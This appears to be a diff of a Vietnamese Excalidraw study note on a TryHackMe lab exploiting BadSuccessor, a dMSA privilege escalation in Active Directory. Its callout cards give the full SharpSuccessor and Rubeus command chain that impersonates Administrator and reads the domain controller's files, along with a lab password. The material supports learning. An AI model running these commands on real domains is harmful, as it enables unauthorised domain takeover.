@@ -6,10 +6,10 @@ tags:
 ---
 
 
-<div class="excalidraw-container" id="ex-5659yi">
+<div class="excalidraw-container" id="ex-vxbqpm">
   <div class="excalidraw-toolbar">
     <div class="excalidraw-badge">
-      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 19l7-7 3 3-7 7-3-3z"></path><path d="M18 13l-1.5-7.5L2 2l3.5 14.5L13 18l5-5z"></path><path d="M2 2l7.586 7.586"></path><circle cx="11" cy="11" r="2"></circle></svg>
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>
       <span>Excalidraw Mindmap</span>
     </div>
     <div class="excalidraw-controls">
@@ -25,6 +25,9 @@ tags:
 <g transform="translate(-76.18,-144.84)">
 <text x="121.29" y="200.84" font-family="Virgil, Segoe UI Emoji, cursive" font-size="16" fill="#c2255c" text-anchor="start"><tspan x="121.29" dy="0">I) Intro</tspan></text>
 </g>
+<a href="../0-asset/pasted-image-20260903201216_261.png" class="excalidraw-node-link external" target="_blank" rel="noopener" title="Xem ảnh: Pasted Image 20260903201216_261.png"><g transform="translate(-76.18,-144.84)">
+<image x="201.5132673783736" y="209.8366241455078" width="744.6989657315341" height="706.1800537109375" href="../0-asset/pasted-image-20260903201216_261.png" preserveAspectRatio="xMidYMid meet" class="excalidraw-embedded-img"/>
+</g></a>
 <g transform="translate(-76.18,-144.84)">
 <path d="M1034.65 281.96 L1035.45 282.25 L1036.30 282.55 L1036.30 282.55" stroke="#1971c2" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
 </g>
@@ -188,6 +191,66 @@ tags:
 <path d="M1116.19 819.19 L1116.83 819.66 L1116.83 819.66" stroke="#1971c2" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
 </g>
 <g transform="translate(-76.18,-144.84)">
+
+<rect x="211.25762939453125" y="1003.1961700439451" width="638.8800048828125" height="811.377606201172" rx="8" fill="#ffffff" stroke="#e0e0e0" stroke-width="1.5" class="excalidraw-md-bg"/>
+<foreignObject x="211.25762939453125" y="1003.1961700439451" width="638.8800048828125" height="811.377606201172" class="excalidraw-foreign-md">
+  <div xmlns="http://www.w3.org/1999/xhtml" class="notion-embed-card">
+    <div class="notion-embed-header">
+      <div class="notion-embed-header-left">
+        <span class="notion-embed-icon">📝</span>
+        <span class="notion-embed-title">📘 Active Directory có nhiều loại tài khoản:</span>
+      </div>
+      <a href="#doc-cd9c56e71c2933eb72840722a82f40dd19bd62ef" class="notion-embed-jump" title="Cuộn xuống đọc chi tiết toàn bộ nội dung">↓ Đọc bài viết</a>
+    </div>
+    <div class="notion-embed-body">
+      <p>Ok, phần này nói về các loại <strong>tài khoản dịch vụ (service account)</strong> trong Active Directory. Để tao giải thích cho mày dễ hiểu.</p>
+<h3>📘 Active Directory có nhiều loại tài khoản:</h3>
+<ul>
+<li><strong>User, computer, group accounts</strong> – mấy cái cơ bản.</li>
+<li><strong>Service accounts</strong> – tài khoản dùng để chạy dịch vụ, tác vụ tự động mà không cần người thật đứng ra quản lý mật khẩu.</li>
+</ul>
+<h3>Có 3 loại Managed Service Account (MSA):</h3>
+<ol>
+<li><p><strong>sMSA (Standalone MSA)</strong>  </p>
+<ul>
+<li>Dùng cho <strong>một máy duy nhất</strong>.  </li>
+<li>AD tự động quản lý mật khẩu, mặc định xoay 30 ngày/lần.  </li>
+<li>Ra mắt từ Windows Server 2008 R2.</li>
+</ul>
+</li>
+<li><p><strong>gMSA (Group MSA)</strong>  </p>
+<ul>
+<li>Dùng cho <strong>nhiều máy cùng lúc</strong> (cụm server, load balancing).  </li>
+<li>AD cũng tự quản lý mật khẩu.  </li>
+<li>Ra mắt từ Windows Server 2012.</li>
+</ul>
+</li>
+<li><p><strong>dMSA (Delegated MSA)</strong>  </p>
+<ul>
+<li>Loại mới nhất, xuất hiện trong <strong>Windows Server 2025</strong>.  </li>
+<li>Dùng để <strong>chuyển đổi tài khoản dịch vụ cũ (legacy service account) thành machine account</strong> – tức là biến tài khoản thường thành dMSA.  </li>
+<li>Khác với gMSA: dMSA do <strong>admin quản lý</strong> (không phải AD tự quản), và chỉ chạy trên <strong>một server cụ thể</strong>.</li>
+</ul>
+</li>
+</ol>
+<h3>🧨 Liên quan tới tấn công BadSuccessor:</h3>
+<ul>
+<li>Nếu attacker có quyền <strong>kiểm soát một dMSA object</strong> (hoặc tự tạo ra dMSA mới), hắn có thể <strong>giả mạo (succeed) Domain Admin</strong> – tức là leo lên quyền cao nhất trong AD.</li>
+<li>Điều kiện bắt đầu:<ul>
+<li>Đã chiếm được một dMSA object có sẵn, hoặc  </li>
+<li>Có khả năng tạo dMSA mới.</li>
+</ul>
+</li>
+</ul>
+<p>Tóm lại: <strong>dMSA là công nghệ mới, nhưng lỏng quyền quản lý nên thành miếng mồi để leo quyền Domain Admin.</strong> Attack lợi dụng việc kiểm soát dMSA object.</p>
+<p>Cần đào sâu thêm chỗ nào thì hỏi nhé! 😎</p>
+
+    </div>
+  </div>
+</foreignObject>
+
+</g>
+<g transform="translate(-76.18,-144.84)">
 <text x="116.18" y="981.95" font-family="Virgil, Segoe UI Emoji, cursive" font-size="16" fill="#c2255c" text-anchor="start"><tspan x="116.18" dy="0">II) hiểu thêm về AD</tspan></text>
 </g>
 <g transform="translate(-76.18,-144.84)">
@@ -228,6 +291,54 @@ tags:
 </g>
 <g transform="translate(-76.18,-144.84)">
 <text x="131.14" y="1847.18" font-family="Virgil, Segoe UI Emoji, cursive" font-size="16" fill="#c2255c" text-anchor="start"><tspan x="131.14" dy="0">III) Thực hành</tspan></text>
+</g>
+<g transform="translate(-76.18,-144.84)">
+
+<rect x="210.09945678710938" y="1879.772398376465" width="688.0501453809146" height="761.1554733276367" rx="8" fill="#ffffff" stroke="#e0e0e0" stroke-width="1.5" class="excalidraw-md-bg"/>
+<foreignObject x="210.09945678710938" y="1879.772398376465" width="688.0501453809146" height="761.1554733276367" class="excalidraw-foreign-md">
+  <div xmlns="http://www.w3.org/1999/xhtml" class="notion-embed-card">
+    <div class="notion-embed-header">
+      <div class="notion-embed-header-left">
+        <span class="notion-embed-icon">📝</span>
+        <span class="notion-embed-title">📘 Bối cảnh:</span>
+      </div>
+      <a href="#doc-62fe77d1d996e74bc4b4d41efa243ab7c2cb714e" class="notion-embed-jump" title="Cuộn xuống đọc chi tiết toàn bộ nội dung">↓ Đọc bài viết</a>
+    </div>
+    <div class="notion-embed-body">
+      <p>Ừ, phần này bắt đầu vào lab thực hành. Mày sẽ đóng vai thằng nhân viên IT tên <strong>Terry Byte</strong> (tbyte) có quyền kiểm tra hệ thống.</p>
+<h3>📘 Bối cảnh:</h3>
+<ul>
+<li>Dùng tài khoản: <code>tbyte</code> / <code>P@SSw0rd345</code> / domain <code>tryhackme.local</code>.</li>
+<li>Kết nối tới máy <strong>Windows Server 2019</strong> (IP: <code>10.211.101.20</code>) qua <strong>RDP</strong>.</li>
+<li>Trên AttackBox, mở <strong>Remmina</strong> (trong menu Applications → Internet) để remote desktop.</li>
+</ul>
+<h3>🧪 Việc đầu tiên:</h3>
+<ul>
+<li>Mở <strong>PowerShell</strong> trên máy Windows đó.</li>
+<li>Chạy script có sẵn ở <code>C:\PoC\Get-BadSuccessorOUPermissions.ps1</code>.</li>
+<li>Script này tìm những tài khoản có quyền đặc biệt để <strong>tạo dMSA trong Organization Unit (OU)</strong>.</li>
+<li>Nó quét các quyền: <code>CreateChild</code>, <code>GenericAll</code>, <code>WriteDACL</code>, <code>WriteOwner</code>.</li>
+</ul>
+<h3>Kết quả:</h3>
+<ul>
+<li>Output liệt kê:<pre><code>TRYHACKME\hmann  {OU=LabOU,DC=tryhackme,DC=local}
+TRYHACKME\tbyte  {OU=LabOU,DC=tryhackme,DC=local}
+</code></pre>
+</li>
+<li>Nghĩa là cả <code>hmann</code> và <code>tbyte</code> đều có quyền tạo dMSA trong OU <code>LabOU</code>.</li>
+</ul>
+<h3>Ý nghĩa:</h3>
+<ul>
+<li>Bước này xác định <strong>tài khoản của mình có khả năng tạo dMSA hay không</strong>. Nếu có, mình có thể thực hiện tiếp tấn công BadSuccessor để leo quyền Domain Admin.</li>
+<li>Trong trường hợp này, <code>tbyte</code> (tài khoản mình đang dùng) đã nằm trong danh sách, nên mình đi tiếp được.</li>
+</ul>
+<p>Tóm lại: <strong>bước này là recon trong AD để tìm xem mình có quyền tạo dMSA không.</strong> Nếu có, leo lên Domain Admin.</p>
+<p>Cần tao giải thích sâu hơn về script hay quyền gì không? 😎</p>
+
+    </div>
+  </div>
+</foreignObject>
+
 </g>
 <g transform="translate(-76.18,-144.84)">
 <path d="M778.18 2008.76 L776.53 2005.31 L776.05 2004.48 L775.62 2003.77 L774.50 2002.22 L773.11 2000.86 L771.25 1999.61 L768.85 1998.60 L767.51 1998.18 L764.21 1997.35 L758.87 1996.82 L755.41 1996.70 L751.46 1996.93 L747.51 1997.29 L743.78 1997.77 L740.10 1998.54 L736.69 1999.37 L734.93 1999.96 L731.73 2001.21 L728.69 2002.82 L726.07 2004.54 L723.78 2006.56 L721.81 2008.76 L719.73 2012.14 L718.98 2014.40 L718.39 2016.72 L718.34 2017.84 L718.34 2019.86 L718.66 2022.18 L719.62 2024.38 L721.06 2026.75 L722.82 2028.89 L725.06 2030.97 L727.62 2032.69 L730.55 2034.18 L733.65 2035.25 L737.11 2036.14 L740.74 2036.56 L744.63 2036.79 L748.74 2036.61 L752.79 2036.26 L757.01 2035.60 L761.06 2034.83 L765.06 2034.00 L768.85 2032.93 L770.66 2032.34 L775.73 2030.32 L778.66 2028.77 L781.33 2026.93 L783.57 2024.85 L785.43 2022.36 L786.77 2019.45 L787.51 2016.12 L787.57 2013.03 L787.30 2011.49 L786.18 2008.34 L784.26 2005.49 L781.75 2003.17 L777.43 2000.86 L774.61 2000.26 L771.67 2000.08 L771.67 2000.08" stroke="#1971c2" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
@@ -373,9 +484,18 @@ tags:
 <g transform="translate(-76.18,-144.84)">
 <path d="M857.49 2096.97 L858.82 2097.26 L861.86 2097.98 L861.86 2097.98" stroke="#1971c2" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
 </g>
+<a href="../0-asset/pasted-image-20260903223351_457.png" class="excalidraw-node-link external" target="_blank" rel="noopener" title="Xem ảnh: Pasted Image 20260903223351_457.png"><g transform="translate(-76.18,-144.84)">
+<image x="243.84805204904626" y="2637.5410576690015" width="597.9828847507534" height="423.7504614960376" href="../0-asset/pasted-image-20260903223351_457.png" preserveAspectRatio="xMidYMid meet" class="excalidraw-embedded-img"/>
+</g></a>
+<a href="../0-asset/pasted-image-20260903224406_980.png" class="excalidraw-node-link external" target="_blank" rel="noopener" title="Xem ảnh: Pasted Image 20260903224406_980.png"><g transform="translate(-76.18,-144.84)">
+<image x="241.49535734757137" y="3079.3059470398784" width="664.6746905782949" height="335.06888511344175" href="../0-asset/pasted-image-20260903224406_980.png" preserveAspectRatio="xMidYMid meet" class="excalidraw-embedded-img"/>
+</g></a>
 <g transform="translate(-76.18,-144.84)">
 <text x="166.69" y="2635.10" font-family="Virgil, Segoe UI Emoji, cursive" font-size="16" fill="#1971c2" text-anchor="start"><tspan x="166.69" dy="0">đầu tiên kết nối bằng remina</tspan></text>
 </g>
+<a href="../0-asset/pasted-image-20260903224626_274.png" class="excalidraw-node-link external" target="_blank" rel="noopener" title="Xem ảnh: Pasted Image 20260903224626_274.png"><g transform="translate(-76.18,-144.84)">
+<image x="236.53467252884798" y="3554.0531200754444" width="571.1293854110542" height="367.380824626704" href="../0-asset/pasted-image-20260903224626_274.png" preserveAspectRatio="xMidYMid meet" class="excalidraw-embedded-img"/>
+</g></a>
 <g transform="translate(-76.18,-144.84)">
 <text x="190.29" y="3527.62" font-family="Virgil, Segoe UI Emoji, cursive" font-size="16" fill="#1971c2" text-anchor="start"><tspan x="190.29" dy="0">1-đầu tiên ta sẽ recon</tspan></text>
 </g>
@@ -384,6 +504,99 @@ tags:
 </g>
 <g transform="translate(-76.18,-144.84)">
 <text x="179.06" y="4009.63" font-family="Virgil, Segoe UI Emoji, cursive" font-size="16" fill="#1971c2" text-anchor="start"><tspan x="179.06" dy="0">tiếp đến là làm cái gì đó ....</tspan></text>
+</g>
+<g transform="translate(-76.18,-144.84)">
+
+<rect x="186.88934326171875" y="4034.7232245669156" width="860.6040754717862" height="1446.5631981625763" rx="8" fill="#ffffff" stroke="#e0e0e0" stroke-width="1.5" class="excalidraw-md-bg"/>
+<foreignObject x="186.88934326171875" y="4034.7232245669156" width="860.6040754717862" height="1446.5631981625763" class="excalidraw-foreign-md">
+  <div xmlns="http://www.w3.org/1999/xhtml" class="notion-embed-card">
+    <div class="notion-embed-header">
+      <div class="notion-embed-header-left">
+        <span class="notion-embed-icon">📝</span>
+        <span class="notion-embed-title">Tổng quan:</span>
+      </div>
+      <a href="#doc-97646fcce91e9d5e4b0accd4333204f53f94ed61" class="notion-embed-jump" title="Cuộn xuống đọc chi tiết toàn bộ nội dung">↓ Đọc bài viết</a>
+    </div>
+    <div class="notion-embed-body">
+      <p>Ừ, phần này là <strong>quá trình khai thác thực tế</strong> lỗi BadSuccessor. Tao sẽ giải thích từng bước cho mày.</p>
+<hr>
+<h3>Tổng quan:</h3>
+<ul>
+<li>Mày sẽ <strong>tạo một dMSA</strong> trong OU mà mình có quyền, sau đó <strong>giả mạo Administrator</strong> để leo quyền Domain Admin.</li>
+<li>Dùng 2 công cụ chính: <strong>SharpSuccessor</strong> (tạo dMSA) và <strong>Rubeus</strong> (thao tác với Kerberos tickets).</li>
+</ul>
+<hr>
+<h3>Bước 1: Tạo dMSA với SharpSuccessor</h3>
+<pre><code class="language-powershell">.\SharpSuccessor.exe add /path:&quot;ou=LabOU,dc=tryhackme,dc=local&quot; /account:tbyte /name:pentest_dmsa /impersonate:Administrator
+</code></pre>
+<p><strong>Giải thích từng tham số:</strong></p>
+<ul>
+<li><code>/path:&quot;ou=LabOU,dc=tryhackme,dc=local&quot;</code> – nơi mày có quyền tạo dMSA (LabOU).</li>
+<li><code>/account:tbyte</code> – tài khoản hiện tại (mày) có quyền tạo dMSA trong OU đó.</li>
+<li><code>/name:pentest_dmsa</code> – tên dMSA sẽ tạo.</li>
+<li><code>/impersonate:Administrator</code> – mục tiêu mày muốn mạo danh là tài khoản Administrator.</li>
+</ul>
+<p>Kết quả:</p>
+<pre><code>[+] Created dMSA object &#39;CN=pentest_dmsa&#39; in &#39;ou=LabOU,dc=tryhackme,dc=local&#39;
+[+] Successfully weaponized dMSA object
+</code></pre>
+<p>Nghĩa là dMSA đã được tạo và “vũ khí hóa” – sẵn sàng để mày giả mạo Admin.</p>
+<hr>
+<h3>Bước 2: Lấy TGT của user hiện tại (tbyte)</h3>
+<pre><code class="language-powershell">.\Rubeus.exe tgtdeleg /nowrap
+</code></pre>
+<ul>
+<li><code>tgtdeleg</code> lợi dụng một tính năng ít biết của Kerberos “unconstrained delegation” để lấy TGT của user hiện tại từ bộ nhớ.</li>
+<li><code>/nowrap</code> giúp xuất base64 trên 1 dòng cho dễ copy.</li>
+</ul>
+<p>Kết quả trả về một chuỗi base64 dài (ticket TGT). Mày cần nó cho bước sau.</p>
+<hr>
+<h3>Bước 3: Xin TGS mạo danh Administrator bằng dMSA</h3>
+<pre><code class="language-powershell">.\Rubeus.exe asktgs /targetuser:pentest_dmsa$ /service:krbtgt/tryhackme.local /opsec /dmsa /nowrap /ptt /ticket:doIFvjC...
+</code></pre>
+<p><strong>Giải thích:</strong></p>
+<ul>
+<li><code>/targetuser:pentest_dmsa$</code> – tài khoản dMSA mày tạo ra, giờ dùng để mạo danh.</li>
+<li><code>/service:krbtgt/tryhackme.local</code> – yêu cầu ticket cho dịch vụ KDC (krbtgt) – chính là TGS để đi tiếp.</li>
+<li><code>/opsec</code> – tránh gây ồn, không dùng RC4, kiểm tra an toàn.</li>
+<li><code>/dmsa</code> – chế độ cho biết đây là ticket dạng computer account.</li>
+<li><code>/ptt</code> – tự động nạp ticket vào phiên hiện tại (pass the ticket).</li>
+<li><code>/ticket:...</code> – truyền TGT lấy ở bước trước.</li>
+</ul>
+<p>Sau lệnh này, Rubeus sẽ trả về một ticket mới, mày copy lại.</p>
+<hr>
+<h3>Bước 4: Lấy service ticket CIFS (truy cập file/SMB)</h3>
+<pre><code class="language-powershell">.\Rubeus.exe asktgs /user:pentest_dmsa$ /service:cifs/DC-LAB2025-01.tryhackme.local /opsec /dmsa /nowrap /ptt /ticket:doIGLjCCB...
+</code></pre>
+<ul>
+<li><code>/user:pentest_dmsa$</code> – vẫn dùng dMSA.</li>
+<li><code>/service:cifs/DC-LAB2025-01.tryhackme.local</code> – yêu cầu ticket cho dịch vụ SMB/CIFS của Domain Controller.</li>
+<li>Các tham số còn lại giống bước trên.</li>
+</ul>
+<p>Kết quả: ticket được import vào memory. Mày giờ có quyền truy cập SMB trên DC với tư cách Administrator.</p>
+<hr>
+<h3>Bước 5: Truy cập Desktop của Administrator</h3>
+<pre><code class="language-powershell">dir \\DC-LAB2025-01.tryhackme.local\c$\Users\Administrator\Desktop\
+</code></pre>
+<ul>
+<li>Dùng ticket đã nạp, mày liệt kê thư mục Desktop của Admin trên DC qua SMB.</li>
+<li>Thấy file <code>flag.txt</code> → thành công leo quyền.</li>
+</ul>
+<hr>
+<h3>Tóm lại:</h3>
+<ul>
+<li>Tạo dMSA <code>pentest_dmsa</code>.</li>
+<li>Lấy TGT của mình.</li>
+<li>Dùng dMSA để xin TGS giả mạo Administrator.</li>
+<li>Dùng TGS đó để xin ticket SMB.</li>
+<li>Kết nối SMB đọc file flag.</li>
+</ul>
+<p>Đây là một chuỗi leo quyền rất thực tế trong môi trường AD. Hỏi tiếp nếu mày muốn đào sâu chỗ nào. 😎</p>
+
+    </div>
+  </div>
+</foreignObject>
+
 </g>
 <g transform="translate(-76.18,-144.84)">
 <path d="M398.75 4138.80 L398.27 4138.09 L397.68 4137.61 L396.88 4137.26 L395.76 4137.20 L392.45 4137.73 L389.73 4138.15 L386.37 4138.92 L382.85 4139.69 L381.15 4140.05 L376.13 4141.18 L372.88 4141.95 L370.00 4142.84 L367.39 4143.55 L364.77 4144.51 L362.37 4145.40 L360.13 4146.41 L359.07 4147.00 L357.20 4148.13 L355.49 4149.44 L353.95 4150.98 L352.19 4153.42 L351.44 4155.26 L351.23 4156.15 L351.17 4157.75 L351.81 4159.65 L353.15 4161.61 L355.49 4163.51 L358.32 4165.12 L361.84 4166.54 L365.84 4167.61 L370.43 4168.56 L372.93 4168.98 L377.63 4169.51 L385.15 4169.99 L390.21 4170.05 L395.33 4170.11 L400.61 4170.05 L406.37 4169.75 L411.97 4169.57 L414.75 4169.39 L420.29 4169.16 L425.84 4168.86 L431.55 4168.56 L437.20 4168.32 L442.43 4168.03 L449.73 4167.91 L454.37 4167.79 L456.67 4167.67 L461.04 4167.49 L465.20 4167.26 L469.25 4167.08 L473.09 4166.78 L476.61 4166.48 L480.35 4166.13 L483.71 4165.77 L485.31 4165.53 L489.73 4164.82 L492.45 4164.40 L494.91 4163.99 L497.04 4163.51 L498.00 4163.34 L499.55 4162.98 L500.83 4162.62 L502.00 4162.33 L503.33 4161.85 L504.24 4161.55 L505.57 4161.02 L506.64 4160.60 L507.65 4160.13 L509.15 4159.18 L509.79 4158.64 L510.37 4158.17 L510.91 4157.34 L511.17 4156.44 L510.59 4154.96 L509.15 4153.06 L508.03 4152.05 L505.15 4150.15 L501.25 4148.07 L494.27 4145.28 L488.93 4143.67 L482.27 4142.07 L474.91 4140.82 L470.96 4140.41 L462.64 4139.63 L453.89 4139.28 L444.72 4139.16 L435.60 4139.28 L426.43 4139.52 L414.59 4140.17 L405.41 4140.88 L401.20 4141.36 L388.93 4142.90 L381.63 4144.39 L378.00 4145.10 L378.00 4145.10" stroke="#1971c2" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
@@ -621,6 +834,60 @@ tags:
 </g>
 <g transform="translate(-76.18,-144.84)">
 <path d="M1030.24 5375.64 L1030.24 5375.64" stroke="#1971c2" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
+</g>
+<g transform="translate(-76.18,-144.84)">
+
+<rect x="185.24827436967325" y="5615.420172338508" width="694.9606045809652" height="855.7712561060956" rx="8" fill="#ffffff" stroke="#e0e0e0" stroke-width="1.5" class="excalidraw-md-bg"/>
+<foreignObject x="185.24827436967325" y="5615.420172338508" width="694.9606045809652" height="855.7712561060956" class="excalidraw-foreign-md">
+  <div xmlns="http://www.w3.org/1999/xhtml" class="notion-embed-card">
+    <div class="notion-embed-header">
+      <div class="notion-embed-header-left">
+        <span class="notion-embed-icon">📝</span>
+        <span class="notion-embed-title">🏨 Hình dung thế này:</span>
+      </div>
+      <a href="#doc-7611ed97d57d785c30c90de43d239dde78631718" class="notion-embed-jump" title="Cuộn xuống đọc chi tiết toàn bộ nội dung">↓ Đọc bài viết</a>
+    </div>
+    <div class="notion-embed-body">
+      <p>Ok mày, không sao. Tao sẽ giải thích cho mày theo kiểu <strong>bình dân, dễ hiểu nhất</strong>, không cần kiến thức AD trước. Cứ như anh em kể chuyện.</p>
+<h3>🏨 Hình dung thế này:</h3>
+<ul>
+<li><strong>Active Directory (AD)</strong> giống như <strong>tòa nhà văn phòng lớn</strong>. Trong đó có nhiều phòng, nhiều tài nguyên (file server, database...). Muốn vào từng phòng, mày phải có <strong>thẻ ra vào</strong>.</li>
+<li><strong>Tài khoản người dùng</strong> = nhân viên. <strong>Tài khoản dịch vụ</strong> = robot lau dọn, robot pha cà phê... (tự động chạy không cần người).</li>
+<li><strong>Domain Admin</strong> = ông chủ tòa nhà, vào được tất cả các phòng.</li>
+</ul>
+<h3>🔑 Kerberos là gì?</h3>
+<ul>
+<li>Là <strong>hệ thống phát thẻ</strong> trong AD. Khi mày đăng nhập, Kerberos đưa cho mày một <strong>tấm giấy thông hành (TGT)</strong>.</li>
+<li>Muốn vào một phòng cụ thể (dịch vụ file SMB), mày phải trình TGT để đổi lấy <strong>vé vào phòng đó (TGS)</strong>.</li>
+<li>Mọi thứ đều là giấy tờ (ticket) nằm trong máy, không cần nhập mật khẩu lại.</li>
+</ul>
+<h3>🧨 Lỗi BadSuccessor dễ hiểu thế này:</h3>
+<ol>
+<li>Mày có quyền tạo một <strong>robot dịch vụ đặc biệt</strong> (gọi là dMSA).</li>
+<li>Do cấu hình lỏng lẻo, robot này có khả năng <strong>giả dạng ông chủ tòa nhà</strong> (Administrator).</li>
+<li>Mày tạo robot đó ra, xong dùng nó xin giấy thông hành giả có tên ông chủ.</li>
+<li>Cầm giấy thông hành đó vào phòng nào cũng được, kể cả phòng bí mật của ông chủ, và lấy cờ (flag).</li>
+</ol>
+<h3>🛠️ Các bước tool đã làm (đừng sa đà vào lệnh):</h3>
+<ul>
+<li><strong>SharpSuccessor</strong> = tạo con robot dMSA biết giả danh Administrator.</li>
+<li><strong>Rubeus</strong> = tay buôn giấy tờ giúp mày xin thẻ giả và đổi vé.</li>
+<li>Cuối cùng, mày dùng vé giả để đọc file trên máy chủ.</li>
+</ul>
+<h3>Đọc lại đoạn trên với tâm thế đó:</h3>
+<ul>
+<li><code>SharpSuccessor.exe add ... /impersonate:Administrator</code> → &quot;tạo robot giả danh ông chủ&quot;.</li>
+<li><code>Rubeus tgtdeleg</code> → &quot;lấy giấy thông hành của mày&quot;.</li>
+<li><code>Rubeus asktgs /targetuser:pentest_dmsa$ ...</code> → &quot;nhờ robot xin vé giả mạo ông chủ&quot;.</li>
+<li><code>dir \\DC...\c$\Users\Administrator\Desktop</code> → &quot;vào phòng ông chủ đọc file&quot;.</li>
+</ul>
+<p>Vậy là mày đã hiểu ý tưởng rồi. Chi tiết kỹ thuật AD thì mình bổ sung dần sau, giờ không cần cày sâu vội. Cứ nắm bức tranh lớn trước.</p>
+<p>Cần tao nói thêm chỗ nào không? 😎</p>
+
+    </div>
+  </div>
+</foreignObject>
+
 </g>
 <g transform="translate(-76.18,-144.84)">
 <text x="159.39" y="5617.17" font-family="Virgil, Segoe UI Emoji, cursive" font-size="16" fill="#1971c2" text-anchor="start"><tspan x="159.39" dy="0">-giải thích dễ hiểu hơn</tspan></text>
@@ -982,6 +1249,9 @@ tags:
 <g transform="translate(-76.18,-144.84)">
 <text x="1057.21" y="5950.88" font-family="Virgil, Segoe UI Emoji, cursive" font-size="16" fill="#1971c2" text-anchor="start"><tspan x="1057.21" dy="0">TGT : vé để đi vào tòa nhà , được kerberos cấp</tspan><tspan x="1057.21" dy="20">khi đăng nhập</tspan><tspan x="1057.21" dy="20"></tspan><tspan x="1057.21" dy="20">TGS : vé để đi vào 1 phòng nào đó ( 1 dịch vụ),</tspan><tspan x="1057.21" dy="20">cái này cũng được kerberos cấp khi mày xòe cái</tspan><tspan x="1057.21" dy="20">TGT ra</tspan></text>
 </g>
+<a href="../0-asset/pasted-image-20260904000020_181.png" class="excalidraw-node-link external" target="_blank" rel="noopener" title="Xem ảnh: Pasted Image 20260904000020_181.png"><g transform="translate(-76.18,-144.84)">
+<image x="197.6039547867643" y="6473.86518304998" width="572.7479098911201" height="702.5566406250001" href="../0-asset/pasted-image-20260904000020_181.png" preserveAspectRatio="xMidYMid meet" class="excalidraw-embedded-img"/>
+</g></a>
 <g transform="translate(-76.18,-144.84)">
 <path d="M1005.72 2588.45 L1006.28 2589.29 L1007.04 2590.13 L1009.67 2592.93 L1011.43 2594.81 L1012.12 2595.79 L1012.12 2595.79" stroke="#1971c2" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
 </g>
@@ -989,3 +1259,225 @@ tags:
     </div>
   </div>
 </div>
+
+
+---
+
+## 📖 Nội dung chi tiết bài viết (Writeup)
+
+<div id="doc-cd9c56e71c2933eb72840722a82f40dd19bd62ef" class="notion-callout-card">
+
+Ok, phần này nói về các loại **tài khoản dịch vụ (service account)** trong Active Directory. Để tao giải thích cho mày dễ hiểu.
+
+### 📘 Active Directory có nhiều loại tài khoản:
+- **User, computer, group accounts** – mấy cái cơ bản.
+- **Service accounts** – tài khoản dùng để chạy dịch vụ, tác vụ tự động mà không cần người thật đứng ra quản lý mật khẩu.
+
+### Có 3 loại Managed Service Account (MSA):
+
+1. **sMSA (Standalone MSA)**  
+   - Dùng cho **một máy duy nhất**.  
+   - AD tự động quản lý mật khẩu, mặc định xoay 30 ngày/lần.  
+   - Ra mắt từ Windows Server 2008 R2.
+
+2. **gMSA (Group MSA)**  
+   - Dùng cho **nhiều máy cùng lúc** (cụm server, load balancing).  
+   - AD cũng tự quản lý mật khẩu.  
+   - Ra mắt từ Windows Server 2012.
+
+3. **dMSA (Delegated MSA)**  
+   - Loại mới nhất, xuất hiện trong **Windows Server 2025**.  
+   - Dùng để **chuyển đổi tài khoản dịch vụ cũ (legacy service account) thành machine account** – tức là biến tài khoản thường thành dMSA.  
+   - Khác với gMSA: dMSA do **admin quản lý** (không phải AD tự quản), và chỉ chạy trên **một server cụ thể**.
+
+### 🧨 Liên quan tới tấn công BadSuccessor:
+- Nếu attacker có quyền **kiểm soát một dMSA object** (hoặc tự tạo ra dMSA mới), hắn có thể **giả mạo (succeed) Domain Admin** – tức là leo lên quyền cao nhất trong AD.
+- Điều kiện bắt đầu:
+  - Đã chiếm được một dMSA object có sẵn, hoặc  
+  - Có khả năng tạo dMSA mới.
+
+Tóm lại: **dMSA là công nghệ mới, nhưng lỏng quyền quản lý nên thành miếng mồi để leo quyền Domain Admin.** Attack lợi dụng việc kiểm soát dMSA object.
+
+Cần đào sâu thêm chỗ nào thì hỏi nhé! 😎
+
+</div>
+
+---
+
+<div id="doc-62fe77d1d996e74bc4b4d41efa243ab7c2cb714e" class="notion-callout-card">
+
+Ừ, phần này bắt đầu vào lab thực hành. Mày sẽ đóng vai thằng nhân viên IT tên **Terry Byte** (tbyte) có quyền kiểm tra hệ thống.
+
+### 📘 Bối cảnh:
+- Dùng tài khoản: `tbyte` / `P@SSw0rd345` / domain `tryhackme.local`.
+- Kết nối tới máy **Windows Server 2019** (IP: `10.211.101.20`) qua **RDP**.
+- Trên AttackBox, mở **Remmina** (trong menu Applications → Internet) để remote desktop.
+
+### 🧪 Việc đầu tiên:
+- Mở **PowerShell** trên máy Windows đó.
+- Chạy script có sẵn ở `C:\PoC\Get-BadSuccessorOUPermissions.ps1`.
+- Script này tìm những tài khoản có quyền đặc biệt để **tạo dMSA trong Organization Unit (OU)**.
+- Nó quét các quyền: `CreateChild`, `GenericAll`, `WriteDACL`, `WriteOwner`.
+
+### Kết quả:
+- Output liệt kê:
+  ```
+  TRYHACKME\hmann  {OU=LabOU,DC=tryhackme,DC=local}
+  TRYHACKME\tbyte  {OU=LabOU,DC=tryhackme,DC=local}
+  ```
+- Nghĩa là cả `hmann` và `tbyte` đều có quyền tạo dMSA trong OU `LabOU`.
+
+### Ý nghĩa:
+- Bước này xác định **tài khoản của mình có khả năng tạo dMSA hay không**. Nếu có, mình có thể thực hiện tiếp tấn công BadSuccessor để leo quyền Domain Admin.
+- Trong trường hợp này, `tbyte` (tài khoản mình đang dùng) đã nằm trong danh sách, nên mình đi tiếp được.
+
+Tóm lại: **bước này là recon trong AD để tìm xem mình có quyền tạo dMSA không.** Nếu có, leo lên Domain Admin.
+
+Cần tao giải thích sâu hơn về script hay quyền gì không? 😎
+
+</div>
+
+---
+
+<div id="doc-97646fcce91e9d5e4b0accd4333204f53f94ed61" class="notion-callout-card">
+
